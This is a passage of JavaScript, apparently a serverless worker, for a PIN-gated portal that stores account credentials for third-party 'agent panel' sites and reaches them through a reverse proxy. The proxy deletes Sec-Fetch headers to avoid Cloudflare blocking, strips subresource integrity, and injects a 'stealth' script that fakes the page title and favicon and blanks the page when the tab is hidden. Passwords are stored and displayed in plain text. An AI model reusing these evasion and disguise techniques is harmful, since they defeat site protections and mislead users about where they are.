                                                                <option value="User" \${conf.r==='User'?'selected':''}>User</option>
                                                            </select>
                                                            <input value="\${conf.u||''}" oninput="uPinSiteConf('\${pin}','\${siteId}',\${idx},'u',this.value)" placeholder="Username" class="w-2/3 bg-black border border-white/10 p-2 text-[10px] text-white outline-none rounded-none">
                                                        </div>
                                                        <input value="\${conf.p||''}" oninput="uPinSiteConf('\${pin}','\${siteId}',\${idx},'p',this.value)" placeholder="Password" class="w-full bg-black border border-white/10 p-2 text-[10px] text-white outline-none rounded-none">
                                                    </div>\`;
                                                });
                                                html += \`<button onclick="addPinSiteAcc('\${pin}','\${siteId}')" class="mt-3 w-full py-2 bg-indigo-500/10 text-[9px] text-indigo-400 font-bold uppercase tracking-widest hover:bg-indigo-500/20 hover:text-white transition border border-indigo-500/20 rounded-none">+ Add Another Account</button>\`;
                                            }
                                            html += \`</div>\`;
                                        });
                                    html += \`</div><button onclick="delPin('\${pin}')" class="mt-5 w-full py-2.5 bg-red-900/20 text-red-500 text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-red-900/50 transition border border-red-900/30 whitespace-nowrap rounded-none">Delete User</button></div></div>\`;
                            });
                            html += \`</div>\`;
                        }

                        if(tab === 'sites') {
                            html += \`<div class="flex justify-between items-center mb-6">
                                <h3 class="text-[10px] font-bold uppercase tracking-[0.2em] text-gray-500">Website Directory</h3>
                                <button onclick="addSite()" class="bg-indigo-600/20 border border-indigo-500/50 text-indigo-400 px-4 py-2 text-[10px] font-bold uppercase tracking-widest hover:bg-indigo-600 hover:text-white transition whitespace-nowrap rounded-none">+ Add Site</button>
                            </div>
                            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">\`;
                            Object.keys(db.sites).forEach(id => {
                                html += \`<div class="square-card p-5 flex flex-col rounded-none">
                                    <div class="mb-4">
                                        <span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Site Name</span>
                                        <input value="\${db.sites[id].name}" oninput="uSiteF('\${id}','name',this.value)" placeholder="Enter Website Name..." class="w-full bg-transparent text-xl font-bold text-white border-b border-white/10 outline-none pb-1 focus:border-indigo-500">
                                    </div>
                                    <div class="space-y-3 mb-5 flex-grow">
                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Agent Link</span>
                                        <input value="\${db.sites[id].agentLink}" oninput="uSiteF('\${id}','agentLink',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-2 text-xs text-green-400 outline-none focus:border-white/30 rounded-none"></div>
                                        
                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">User Link</span>
                                        <input value="\${db.sites[id].userLink}" oninput="uSiteF('\${id}','userLink',this.value)" placeholder="ag.example.com" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-blue-400 outline-none focus:border-white/30 rounded-none"></div>
                                        
                                        <div>
                                            <span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Backend API Link</span>
                                            <input value="\${db.sites[id].apiLink||''}" oninput="uSiteF('\${id}','apiLink',this.value)" placeholder="e.g. https://liveapi247.live" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-purple-400 outline-none focus:border-white/30 rounded-none">
                                        </div>
                                    </div>
                                    <button onclick="delSite('\${id}')" class="w-full py-2.5 bg-red-900/20 text-red-500 text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-red-900/50 transition border border-red-900/30 whitespace-nowrap rounded-none">Delete Site</button>
                                </div>\`;
                            });
                            html += \`</div>\`;
                        }
                        
                        if(tab === 'settings') {
                            let n = db.settings.notification || {};
                            html += \`<div class="grid grid-cols-1 md:grid-cols-2 gap-5">
                                <div class="square-card p-6 rounded-none">
                                    <h2 class="text-sm font-bold tracking-widest uppercase mb-6 text-green-500">WhatsApp Float</h2>
                                    <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Phone Number</label>
                                    <input value="\${db.settings.whatsapp||''}" oninput="uSet('whatsapp',this.value)" placeholder="+8801..." class="w-full bg-black/50 border border-white/10 p-3 text-sm outline-none focus:border-green-500 text-green-400 rounded-none">
                                </div>
                                <div class="square-card p-6 rounded-none">
                                    <h2 class="text-sm font-bold tracking-widest uppercase mb-6 text-indigo-500">Dashboard Notification</h2>
                                    <label class="flex items-center gap-3 text-xs cursor-pointer mb-5">
                                        <input type="checkbox" \${n.enabled ? 'checked':''} onchange="uNotif('enabled', this.checked)" class="square-checkbox w-4 h-4">
                                        <span class="text-gray-300 font-bold uppercase tracking-widest">Enable Notification</span>
                                    </label>
                                    <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Message Text</label>
                                    <textarea oninput="uNotif('text', this.value)" placeholder="Type message for users..." class="w-full bg-black/50 border border-white/10 p-3 text-sm outline-none focus:border-indigo-500 text-white rounded-none mb-4" rows="3">\${n.text||''}</textarea>
                                    <div class="flex gap-4">
                                        <div class="w-1/2">
                                            <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Button Text</label>
                                            <input value="\${n.btnText||''}" oninput="uNotif('btnText', this.value)" placeholder="e.g. Join Channel" class="w-full bg-black/50 border border-white/10 p-3 text-sm outline-none focus:border-indigo-500 text-white rounded-none">
                                        </div>
                                        <div class="w-1/2">
                                            <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Button Link</label>
                                            <input value="\${n.btnLink||''}" oninput="uNotif('btnLink', this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-3 text-sm outline-none focus:border-indigo-500 text-blue-400 rounded-none">
                                        </div>
                                    </div>
                                </div>
                            </div>\`;
                        }
                        document.getElementById('app').innerHTML = html;
                    }
                    load();
                </script>
            </body>
            </html>`;
            return new Response(adminHTML, { headers: { "Content-Type": "text/html" } });
        }

        // --- 💻 USER DASHBOARD & PROXY INIT ---
        if (path === "/dashboard") {
            if (!isUser) return Response.redirect(url.origin, 302);
            
            const userData = db.pins[userPin];
            let sitesHTML = '';

            if (userData.sites && userData.sites.length > 0) {
                userData.sites.forEach(siteId => {
                    const site = db.sites[siteId];
                    if (!site) return;
                    
                    const isSuspended = userData.status === 'suspended';
                    const statusText = isSuspended ? 'Suspended' : 'Active';
                    const statusColor = isSuspended ? 'text-red-400 border-red-400/20 bg-red-400/10' : 'text-green-400 border-green-400/20 bg-green-400/10';
                    const safeSiteName = (site.name || 'Unnamed Site').replace(/'/g, "\\'").replace(/"/g, '&quot;');
                    
                    let confs = userData.siteConf?.[siteId] ||[];
                    if (!Array.isArray(confs)) confs = [confs];
                    
                    let accountsHtml = '';
                    confs.forEach((conf, idx) => {
                        let roleColor = conf.r === 'Admin' ? 'text-purple-400 border-purple-400/20 bg-purple-400/10' : 
                                        conf.r === 'Super Agent' ? 'text-blue-400 border-blue-400/20 bg-blue-400/10' : 
                                        'text-yellow-400 border-yellow-400/20 bg-yellow-400/10';
                        
                        const hasPwd = conf.p && conf.p.trim() !== '';
                        const loginAction = hasPwd 
                            ? `window.location.href='/api/start-proxy?id=${siteId}&acc=${idx}'` 
                            : `CustomModal.show({type:'alert', title:'<span class=\\'text-yellow-500\\'>⚠ UPDATE REQUIRED</span>', text:'Please update your password first before accessing the panel.'})`;

                        accountsHtml += `
                        <div class="border border-white/10 bg-[#0f0f0f] rounded-none p-4 relative shadow-sm">
                            <div class="flex justify-between items-center mb-3">
                                <span class="text-[9px] font-bold uppercase tracking-widest px-2 py-0.5 border ${roleColor} rounded-none">${conf.r}</span>
                            </div>
                            
                            <div class="space-y-2 mb-4">
                                <div class="bg-black border border-white/10 flex items-center p-1.5 w-full rounded-none">
                                    <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[70px]">Username</span>
                                    <input type="text" readonly value="${conf.u}" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate select-all font-mono">
                                    <button onclick="copyLink('${conf.u}', this)" class="w-7 h-7 flex items-center justify-center bg-indigo-500/10 text-indigo-400 hover:bg-indigo-500 hover:text-white transition-all flex-shrink-0 rounded-none border border-indigo-500/30" title="Copy Username">
                                        <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="square" stroke-linejoin="miter" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13"></rect><path d="M5 15H4V4h11v1"></path></svg>
                                    </button>
                                </div>
                                
                                <div class="bg-black border border-white/10 flex items-center p-1.5 w-full relative rounded-none">
                                    <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[70px]">Password</span>
                                    <input type="text" readonly value="${conf.p || ''}" id="pwd-disp-${siteId}-${idx}" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate font-mono" style="-webkit-text-security: disc; font-family: text-security-disc, sans-serif;">
                                    <div class="flex gap-1 flex-shrink-0">
                                        <button onclick="toggleVisibility('pwd-disp-${siteId}-${idx}', this)" class="w-7 h-7 flex items-center justify-center bg-white/5 text-gray-400 hover:bg-white/10 hover:text-white transition-all rounded-none border border-white/10" title="Show/Hide">
                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="square" stroke-linejoin="miter" stroke-width="2" d="M2.458 12C3.732 7.943 7.522 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
                                        </button>
                                        <button onclick="copyLink(document.getElementById('pwd-disp-${siteId}-${idx}').value, this)" class="w-7 h-7 flex items-center justify-center bg-indigo-500/10 text-indigo-400 hover:bg-indigo-500 hover:text-white transition-all flex-shrink-0 rounded-none border border-indigo-500/30" title="Copy Pwd">
                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="square" stroke-linejoin="miter" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13"></rect><path d="M5 15H4V4h11v1"></path></svg>
                                        </button>
                                        <button onclick="toggleEditPwd('${siteId}-${idx}')" class="w-7 h-7 flex items-center justify-center bg-yellow-500/10 text-yellow-400 hover:bg-yellow-500 hover:text-black transition-all rounded-none border border-yellow-500/30" title="Update">
                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                                        </button>
                                    </div>
                                </div>
                                
                                <div id="pwd-edit-${siteId}-${idx}" class="hidden flex gap-2 pt-2 border-t border-white/10">
                                    <input type="text" id="pwd-in-${siteId}-${idx}" placeholder="Type new password..." class="flex-grow bg-black/50 border border-white/10 p-2 text-xs text-white outline-none focus:border-yellow-500 rounded-none transition-colors">
                                    <button onclick="savePwd('${siteId}', ${idx})" class="px-4 bg-yellow-500/20 text-yellow-400 border border-yellow-500/50 hover:bg-yellow-500 hover:text-black transition-all text-[9px] font-bold uppercase tracking-widest whitespace-nowrap rounded-none">Save</button>
                                </div>
                            </div>

                            ${isSuspended ? 
                                `<button disabled class="w-full py-3 bg-white/5 text-gray-500 text-[10px] font-bold uppercase tracking-[0.2em] cursor-not-allowed border border-white/5 whitespace-nowrap rounded-none">Suspended</button>` 
                                : 
                                `<button onclick="${loginAction}" class="w-full py-3 bg-indigo-600 text-white text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-indigo-500 transition-colors flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(99,102,241,0.3)] whitespace-nowrap flex-shrink-0 rounded-none"><span>Login Agent Panel</span><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" stroke-width="2" d="M15.75 9V5.25A2.25 2.25 0 0013.5 3h-6a2.25 2.25 0 00-2.25 2.25v13.5A2.25 2.25 0 007.5 21h6a2.25 2.25 0 002.25-2.25V15M12 9l-3 3m0 0l3 3m-3-3h12.75"></path></svg></button>`
                            }
                        </div>`;
                    });

                    sitesHTML += `
                    <div class="border border-white/5 bg-[#0a0a0a] flex flex-col rounded-none shadow-lg overflow-hidden ${isSuspended ? 'opacity-60 grayscale' : ''}">
                        <div class="flex justify-between items-center p-5 cursor-pointer hover:bg-white/5 transition" onclick="toggleDetails('${siteId}')">
                            <div class="flex items-center gap-4">
                                <div class="w-10 h-10 bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center rounded-none flex-shrink-0">
                                    <svg class="w-5 h-5 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" stroke-width="1.5" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"></path></svg>
                                </div>
                                <div class="overflow-hidden">
                                    <h2 class="text-lg font-bold text-white tracking-wide truncate">${safeSiteName}</h2>
                                    <p class="text-[9px] text-gray-500 uppercase tracking-widest mt-0.5">${confs.length} Account${confs.length>1?'s':''} Assigned</p>
                                </div>
                            </div>
                            <div class="flex items-center gap-3 flex-shrink-0">
                                <span class="text-[8px] font-bold uppercase tracking-widest px-2 py-1 border rounded-none ${isSuspended?'text-red-400 border-red-400/20 bg-red-400/10':'text-green-400 border-green-400/20 bg-green-400/10'}">${isSuspended ? 'Suspended' : 'Active'}</span>
                                <svg id="arrow-${siteId}" class="w-5 h-5 text-gray-500 transition-transform duration-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                            </div>
                        </div>
                        
                        <div id="details-${siteId}" class="hidden border-t border-white/5 bg-black/40 p-5 space-y-4">
                            <div class="bg-white/5 border border-white/10 flex items-center p-1.5 w-full rounded-none mb-2">
                                <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[60px]">Portal</span>
                                <input type="text" readonly value="${site.userLink}" class="flex-grow bg-transparent text-[11px] text-blue-400 px-2 outline-none min-w-0 truncate select-all">
                                <button onclick="copyLink('${site.userLink}', this)" class="w-7 h-7 flex items-center justify-center bg-indigo-500/10 text-indigo-400 hover:bg-indigo-500 hover:text-white transition-all flex-shrink-0 rounded-none border border-indigo-500/30" title="Copy Link"><svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="square" stroke-linejoin="miter" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13"></rect><path d="M5 15H4V4h11v1"></path></svg></button>
                            </div>
                            
                            <div class="space-y-4">
                                ${accountsHtml}
                            </div>
                        </div>
                    </div>`;
                });
            } else {
                sitesHTML = `<p class="text-gray-500 text-xs text-center w-full mt-10">No sites assigned to this PIN.</p>`;
            }

            // Notification Injected from DB Settings
            const nSet = db.settings.notification || {};
            let notifHTML = '';
            if(nSet.enabled && nSet.text) {
                let btnHtml = nSet.btnText && nSet.btnLink ? `<a href="${nSet.btnLink.replace(/"/g, '&quot;')}" target="_blank" class="w-full text-center px-6 py-3 bg-indigo-600 text-white font-bold uppercase tracking-widest text-[10px] hover:bg-indigo-500 transition shadow-[0_0_15px_rgba(99,102,241,0.4)] border border-indigo-500 mb-3 rounded-none block">${nSet.btnText.replace(/"/g, '&quot;')}</a>` : '';
                notifHTML = `
                <div id="nx-admin-notif" class="fixed inset-0 z-[200] flex items-center justify-center bg-black/80 backdrop-blur-md">
                    <div class="bg-[#0a0a0a] border border-white/10 p-6 max-w-sm w-full mx-4 shadow-2xl flex flex-col rounded-none relative">
                        <button onclick="document.getElementById('nx-admin-notif').remove()" class="absolute top-4 right-4 text-gray-500 hover:text-white transition"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg></button>
                        <h3 class="text-white font-bold tracking-widest mb-4 uppercase text-sm flex items-center gap-2 text-indigo-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-width="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg> 
                            Administrator Notice
                        </h3>
                        <p class="text-gray-300 text-xs mb-6 leading-relaxed whitespace-pre-wrap font-sans">${nSet.text.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</p>
                        ${btnHtml}
                        <button onclick="document.getElementById('nx-admin-notif').remove()" class="w-full px-6 py-3 bg-white/5 text-gray-300 hover:bg-white/10 hover:text-white font-bold uppercase tracking-widest text-[10px] transition border border-white/10 rounded-none">Acknowledge & Close</button>
                    </div>
                </div>
                `;
            }

            const html = `<!DOCTYPE html><html lang="en" class="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Core | Portal</title><link rel="icon" type="image/jpeg" href="https://i.postimg.cc/zXbrDz13/modern-security-logo-design-safe-your-internet-privacy-1017-51245.jpg"><script src="https://cdn.tailwindcss.com"></script>
            <style>body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; }</style></head>
            <body class="pb-20">
                ${notifHTML}
                ${customModalScript}
                
                <header class="sticky top-0 z-40 flex justify-between items-center border-b border-white/10 bg-[#0a0a0a] p-4 md:p-6 shadow-md w-full">
                    <div>
                        <h1 class="text-lg md:text-xl font-bold tracking-widest uppercase text-indigo-400">ID: <span class="text-white">${userPin}</span></h1>
                        <p class="text-[9px] text-gray-500 mt-0.5 uppercase tracking-[0.2em]">Secure Access Node</p>
                    </div>
                    <a href="/logout" class="px-5 py-2.5 bg-red-900/20 text-[10px] font-bold tracking-widest uppercase border border-red-900/50 text-red-500 hover:bg-red-600 hover:text-white transition whitespace-nowrap rounded-none">Terminate</a>
                </header>

                <div class="max-w-6xl mx-auto p-4 md:p-8">
                    <h3 class="text-[9px] font-bold uppercase tracking-[0.2em] text-gray-500 mb-4 border-b border-white/10 pb-2">Your Environments</h3>
                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-5">${sitesHTML}</div>
                </div>
                <script>
                    function toggleVisibility(id, btn) {
                        const el = document.getElementById(id);
                        if(el.style.webkitTextSecurity === 'disc') {
                            el.style.webkitTextSecurity = 'none';
                            btn.innerHTML = '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" /></svg>';
                            btn.classList.remove('text-gray-400'); btn.classList.add('text-green-400');
                        } else {
                            el.style.webkitTextSecurity = 'disc';
                            btn.innerHTML = '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="square" stroke-linejoin="miter" stroke-width="2" d="M2.458 12C3.732 7.943 7.522 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>';
                            btn.classList.remove('text-green-400'); btn.classList.add('text-gray-400');
                        }
                    }

                    function copyLink(text, btn) {
                        if(!text) return;
                        navigator.clipboard.writeText(text);
                        const old = btn.innerHTML;
                        btn.innerHTML = '<svg class="w-4 h-4 text-green-400" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="square" stroke-linejoin="miter" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>';
                        setTimeout(() => btn.innerHTML = old, 1500);
                    }
                    
                    function toggleDetails(id) {
                        const el = document.getElementById('details-' + id), arrow = document.getElementById('arrow-' + id);
                        if(el.classList.contains('hidden')) { el.classList.remove('hidden'); arrow.classList.add('rotate-180'); } 
                        else { el.classList.add('hidden'); arrow.classList.remove('rotate-180'); }
                    }
                    
                    function toggleEditPwd(id) {
                        const el = document.getElementById('pwd-edit-' + id);
                        el.classList.toggle('hidden');
                    }
                    
                    async function savePwd(siteId, accIdx) {
                        const pwd = document.getElementById('pwd-in-' + siteId + '-' + accIdx).value;
                        if(!pwd) return CustomModal.show({type:'alert', title:'<span class="text-red-500">⚠</span> Error', text:'Password cannot be empty!'});
                        
                        try {
                            const res = await fetch('/api/update-password', { method: 'POST', body: JSON.stringify({ siteId, accIdx, newPassword: pwd }) });
                            if(res.ok) {
                                document.getElementById('pwd-disp-' + siteId + '-' + accIdx).value = pwd;
                                document.getElementById('pwd-edit-' + siteId + '-' + accIdx).classList.add('hidden');
                                CustomModal.show({type:'alert', title:'<span class="text-green-500">✔</span> Success', text:'Password Updated Successfully!'});
                            }
                        } catch(e) {}
                    }
                </script>
            </body></html>`;
            return new Response(html, { headers: { "Content-Type": "text/html" } });
        }

        // --- 🚀 PROXY START ---
        if (path === "/api/start-proxy") {
            if (!isUser) return new Response("Denied", { status: 403 });
            const siteId = url.searchParams.get("id");
            const accIdx = parseInt(url.searchParams.get("acc") || "0", 10);
            
            const userData = db.pins[userPin];
            if (userData.status === 'suspended' || !userData.sites.includes(siteId) || !db.sites[siteId]) return new Response("Access Denied", { status: 403 });
            
            let confs = userData.siteConf?.[siteId] ||[];
            if (!Array.isArray(confs)) confs =[confs];
            const conf = confs[accIdx] || {};

            const proxyData = JSON.stringify({ 
                t: db.sites[siteId].agentLink, 
                a: db.sites[siteId].apiLink || '', 
                u: conf.u || '', 
                p: conf.p || '' 
            });
            const encryptedData = encrypt(proxyData);

            return new Response("Starting...", {
                status: 302,
                headers: { "Location": "/", "Set-Cookie": `proxy_active=${encryptedData}; HttpOnly; Path=/; Max-Age=3600; SameSite=Lax` }
            });
        }
        if (path === "/api/stop-proxy") return new Response("Stopped", { status: 302, headers: { "Location": "/", "Set-Cookie": "proxy_active=; Max-Age=0; Path=/" } });

        // --- 🌐 GLOBAL PROXY ENGINE ---
        if (isUser && isProxyActive) {
            const proxyDataString = decrypt(isProxyActive);
            if(!proxyDataString) return new Response("Invalid Proxy", { status: 400 });
            
            let proxyData;
            try { proxyData = JSON.parse(proxyDataString); } catch(e) { proxyData = { t: proxyDataString, a: '', u: '', p: '' }; }

            const targetDomain = proxyData.t;
            const autoApi = proxyData.a;
            const autoUser = proxyData.u;
            const autoPwd = proxyData.p;

            const targetUrl = new URL(request.url);
            const tDomainObj = new URL(targetDomain);
            targetUrl.hostname = tDomainObj.hostname;
            targetUrl.protocol = tDomainObj.protocol;
            targetUrl.port = tDomainObj.port;

            if (request.headers.get("Upgrade") === "websocket") {
                const wsUrl = new URL(request.url);
                wsUrl.hostname = tDomainObj.hostname;
                wsUrl.protocol = tDomainObj.protocol === 'https:' ? 'wss:' : 'ws:';
                
                const wsHeaders = new Headers(request.headers);
                wsHeaders.set("Host", tDomainObj.hostname);
                wsHeaders.set("Origin", targetDomain);
                
                return fetch(new Request(wsUrl.toString(), request), { headers: wsHeaders });
            }

            const proxyHeaders = new Headers(request.headers);
            proxyHeaders.set("Host", targetUrl.hostname);
            proxyHeaders.set("Origin", targetDomain);
            
            const reqReferer = request.headers.get("Referer");
            if (reqReferer) {
                try {
                    let refUrl = new URL(reqReferer);
                    if (refUrl.hostname === url.hostname) {
                        proxyHeaders.set("Referer", targetDomain + refUrl.pathname + refUrl.search);
                    } else {
                        proxyHeaders.set("Referer", targetDomain + "/");
                    }
                } catch(e) { proxyHeaders.set("Referer", targetDomain + "/"); }
            } else {
                proxyHeaders.set("Referer", targetDomain + "/");
            }
            
            // ✅ STOP CLOUDFLARE BLOCKING AND STRIP BROWSER SECURTY FOR PROXY REQUEST
            proxyHeaders.delete("Accept-Encoding");
            proxyHeaders.set("Accept-Encoding", "identity"); 
            proxyHeaders.delete("Sec-Fetch-Dest");
            proxyHeaders.delete("Sec-Fetch-Mode");
            proxyHeaders.delete("Sec-Fetch-Site");
            proxyHeaders.delete("Sec-Fetch-User");

            delete cookies['portal_session'];
            delete cookies['proxy_active'];
            const cleanCookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
            if (cleanCookieStr) proxyHeaders.set("Cookie", cleanCookieStr); else proxyHeaders.delete("Cookie");

            const fetchConfig = { method: request.method, headers: proxyHeaders, redirect: "manual" };
            if (["POST", "PUT", "PATCH", "DELETE"].includes(request.method)) fetchConfig.body = request.body;

            const proxyRes = await fetch(targetUrl.toString(), fetchConfig);
            
            const contentType = proxyRes.headers.get("Content-Type") || "";
            const isHtml = contentType.toLowerCase().includes("text/html");
            const responseHeaders = cleanHeaders(proxyRes, url.origin, isHtml);

            const locationHeader = responseHeaders.get("Location");
            if (locationHeader) {
                if(locationHeader.startsWith(targetDomain)) {
                    responseHeaders.set("Location", locationHeader.replace(targetDomain, url.origin));
                } else if (!locationHeader.startsWith('/')) {
                    responseHeaders.set("Location", "/__api_proxy?target=" + encodeURIComponent(locationHeader));
                }
            }

            responseHeaders.append("Set-Cookie", `proxy_active=${isProxyActive}; HttpOnly; Path=/; Max-Age=3600; SameSite=Lax`);

            let body = proxyRes.body;
            
            // 🚀 ONLY PROXY HTML. LEAVE CSS & JS UNTOUCHED SO THEY LOAD PERFECTLY!
            if (isHtml) {
                try {
                    let htmlText = await proxyRes.text();
                    
                    // ✅ DOMAIN REPLACEMENTS
                    htmlText = htmlText.split(targetDomain).join(url.origin);
                    const schemaLessTarget = targetDomain.replace(/^https?:\/\//, '//');
                    htmlText = htmlText.split(schemaLessTarget).join('//' + url.host);

                    // ✅ FIX INTEGRITY & CROSSORIGIN BLOCKING
                    htmlText = htmlText.replace(/integrity=["'][^"']*["']/gi, '');
                    htmlText = htmlText.replace(/crossorigin=["'][^"']*["']/gi, '');
                    htmlText = htmlText.replace(/<base\s+href=["'][^"']+["']\s*\/?>/gi, '');

                    // ✅ ROUTE EXTERNAL ASSETS VIA PROXY (Bypass CORS)
                    htmlText = htmlText.replace(/(href|src)=["'](https?:\/\/[^"']+)["']/gi, (match, p1, p2) => {
                        if (p2.startsWith(targetDomain) || p2.startsWith(url.origin) || p2.includes(url.host) || p2.startsWith('http://www.w3.org')) return match;
                        return `${p1}="/__api_proxy?target=${encodeURIComponent(p2)}"`;
                    });
                    
                    htmlText = htmlText.replace(/(href|src)=["'](\/\/[^"']+)["']/gi, (match, p1, p2) => {
                        return `${p1}="/__api_proxy?target=${encodeURIComponent('https:' + p2)}"`;
                    });
                    
                    const encTargetTrim = encrypt(targetDomain).substring(0,8);
                    
                    const stealthScript = `<script>
(function(){
    try{
        var p = performance.getEntriesByType("navigation")[0];
        if (p && p.type === "reload") {
            window.location.replace("/api/stop-proxy");
            return;
        }
        if (window.performance && window.performance.navigation && window.performance.navigation.type === 1) {
             window.location.replace("/api/stop-proxy");
             return;
        }

        var l=Date.now();
        setInterval(function(){if(Date.now()-l>60000)window.location.replace("/api/stop-proxy");l=Date.now();},2000);
        document.addEventListener("visibilitychange",function(){if(document.visibilityState==="hidden")document.body.style.opacity="0";else{document.body.style.opacity="1";if(Date.now()-l>60000)window.location.replace("/api/stop-proxy");l=Date.now();}});
        
        var ctx = '${encTargetTrim}';
        if(!window.location.search.includes('_ctx=')){
            var sep = window.location.search ? '&' : '?';
            window.history.replaceState(null, '', window.location.pathname + window.location.search + sep + '_ctx=' + ctx);
        }

        const fixedTitle = "Nexus Digital | Enterprise Solutions";
        const fixedFavicon = "https://i.postimg.cc/zXbrDz13/modern-security-logo-design-safe-your-internet-privacy-1017-51245.jpg";

        function lockIdentity() {
            if(document.title !== fixedTitle) document.title = fixedTitle;
            let icons = document.querySelectorAll('link[rel~="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]');
            let hasIcon = false;
            icons.forEach(i => {
                if(i.href === fixedFavicon) hasIcon = true;
                else i.remove();
            });
            if(!hasIcon) {
                let link = document.createElement('link');
                link.rel = 'icon'; link.type = 'image/jpeg'; link.href = fixedFavicon;
                document.head.appendChild(link);
            }
        }
        lockIdentity();
        let headObserver = new MutationObserver(lockIdentity);
        headObserver.observe(document.head, { subtree: true, childList: true, attributes: true, characterData: true });

        if(!document.querySelector('meta[name="viewport"]')){
            let v = document.createElement('meta');
            v.name = "viewport"; v.content = "width=device-width, initial-scale=1.0";
            document.head.appendChild(v);
        }
        
        var targetHost = new URL("` + targetDomain + `").hostname;
        var apiTarget = "${autoApi}";
        var apiHost = apiTarget ? new URL(apiTarget).hostname : "";

        const rewriteNode = function(el) {
            if (el && el.tagName) {
                var tag = el.tagName.toLowerCase();
                if ((tag === 'script' && el.src) || (tag === 'link' && el.href)) {
                    var u = tag === 'script' ? el.src : el.href;
                    if (u.startsWith('http') && !u.includes(window.location.hostname)) {
                        var proxied = '/__api_proxy?target=' + encodeURIComponent(u);
                        if (tag === 'script') el.src = proxied;
                        else el.href = proxied;
                    }
                    if (el.integrity) el.removeAttribute('integrity');
                    if (el.crossOrigin) el.removeAttribute('crossOrigin');
                }
            }
        };
        const origAppend = Element.prototype.appendChild;
        Element.prototype.appendChild = function() {
